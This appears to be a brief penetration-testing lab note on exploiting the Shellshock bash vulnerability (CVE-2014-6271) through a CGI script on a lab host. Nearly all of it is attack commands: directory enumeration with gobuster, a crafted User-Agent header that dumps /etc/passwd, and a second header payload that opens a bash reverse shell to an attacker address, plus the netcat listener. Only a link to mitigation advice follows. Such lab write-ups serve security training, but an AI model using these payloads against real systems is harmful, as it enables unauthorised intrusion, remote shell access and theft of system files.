## Shellshock

https://nvd.nist.gov/vuln/detail/CVE-2014-6271

**Enumeration - Gobuster
```
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
```
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

**Confirming the Vulnerability
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

**Exploitation to Reverse Shell Access
```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
sudo nc -lvnp 7777
```


## Mitigation
https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability
